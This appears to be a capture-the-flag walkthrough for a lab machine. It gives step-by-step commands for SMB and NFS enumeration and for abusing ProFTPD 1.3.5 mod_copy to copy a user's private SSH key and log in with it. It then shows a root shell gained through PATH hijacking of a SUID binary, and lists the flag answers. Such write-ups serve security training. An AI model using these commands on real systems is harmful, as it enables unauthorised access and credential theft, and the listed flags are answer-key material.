export IP=10.10.57.38


==================================================

[TASK 1] - Deploy the vulnerable machine

1) Scan the machine with nmap, how many open ports are open?

	Command: `nmap -sV -sC -oN nmap/initial 10.10.12.0`
	Answer: `7`


==================================================

[TASK 2] - Enumerating Samba for shares

1) Using nmap we can enumerate a machine for SMB shares. Nmap has the ability to run to automate a wide variety of networking tasks. There is a script to enumerate shares (See command). Using the nmap command below, how many shares have been found?


	Command: `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $IP`
	Answer: `3`

2) On most distributions of Linux smbclient is already installed. Lets inspect one of the shares, smbclient //<ip>/anonymous. Using your machine, connect to the machines network share. Once you're connected, list the files on the share. What is the file can you see?

	Command: `smbclient //$IP/anonymous` + No password + `ls`
	Answer: `log.txt`

3) You can recursively download the SMB share too. Submit the username and password as nothing after running the command, smbget -R smb://<ip>/anonymous. Open the file on the share. There is a few interesting things found:
	- Information generated for Kenobi when generating an SSH key for the user
	- Information about the ProFTPD server.
What port is FTP running on?

	Command: `smbget -R smb://<ip>/anonymous`
	Notes: Running the above command downloaded everything that was on the SMB share (anonymous access) into my local directory. I was then able to cat out the log.txt file and see some interesting information (there was a RSA SSH key).
	Answer: `21`

4) Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just an server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. In our case, port 111 is access to a network file system. Lets use nmap to enumerate this using the command, nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $IP. What mount can we see?

	Command: `nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount -oN nmap/nfs-scan $IP`
	Answer: `/var`


==================================================

[TASK 3] - Gain initial access with ProFtpd

1) Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP port. What is the version?

	Command: `nc $IP 21`
	Notes: The version popped up on connection, but it was also listed in my nmap/initial scan.
	Answer: `1.3.5`
	
2) We can use searchsploit to find exploits for a particular software version. Searchsploit is basically just a command line search tool for exploit-db.com. How many exploits are there for the ProFTPd running?

	Command: `searchsploit proftpd 1.3.5`
	Answer: `3`

3) You should have found an exploit from ProFtpd's mod_copy module. The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination. We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user. 

4) We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands. We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory.

	Command:
		1) `nc $IP 21`
		2) `SITE CPFR /home/kenobi/.ssh/id_rsa`
		3) `SITE CPTO /var/tmp/id_rsa`
	Notes:
		We knew where the ssh key was being held from the log.txt: 'Your identification has been saved in /home/kenobi/.ssh/id_rsa.'. Then from task 2, question 4, we knew that we could see or mount the /var directory.

5) Lets mount the /var/tmp directory to our machine (follow commands). We now have a network mount on our deployed machine! We can go to /var/tmp and get the private key then login to Kenobi's account. What is Kenobi's user flag (/home/kenobi/user.txt)?

	Command:
		1) `mkdir ./kenobiNFS`
		2) `mount $IP:/var ./kenobiNFS`
		3) `ls -al ./kenobiNFS`
		4) `cd ./kenobiNFS/tmp`
		5) `ssh -i id_rsa kenobi@$IP`
		6) `cat user.txt`
	Answer: `d0b0f3f53b6caa532a83915e19224899`


==================================================

[TASK 4] - Privilege Escalation with Path Variable Manipulation

1) SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues. To search the a system for these type of files run the following: `find / -perm -u=s -type f 2>/dev/null`. What file looks particularly out of the ordinary?

	Command: `find / -perm -u=s -type f 2>/dev/null`
	Answer: `/usr/bin/menu`

2) Run the binary, how many options appear?

	Command: `/usr/bin/menu`
	Answer: `3`

3) Strings is a command on Linux that looks for human readable strings on a binary. This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname). As this file runs as the root users privileges, we can manipulate our path gain a root shell.

	Command: 
		1) `strings /usr/bin/menu`
		2) `echo /bin/bash > curl`
		3) `chmod 777 curl`
		4) `export PATH=/tmp:$PATH`
		5) `/usr/bin/menu`
	Notes: 
		In the output from the above command (#1), this is shown:
		curl -I localhost
		uname -r
		ifconfig
		Meaning that the /usr/bin/menu program runs curl as a Path variable command. We can use that to create our own 'curl' path variable to escalate our privileges rather than running an actual curl request. Thats what commands 2 through 4 do (create our own curl Path variable).

4) What is the root flag (/root/root.txt)?

	Answer: `177b3cd8562289f37382721c28381f02`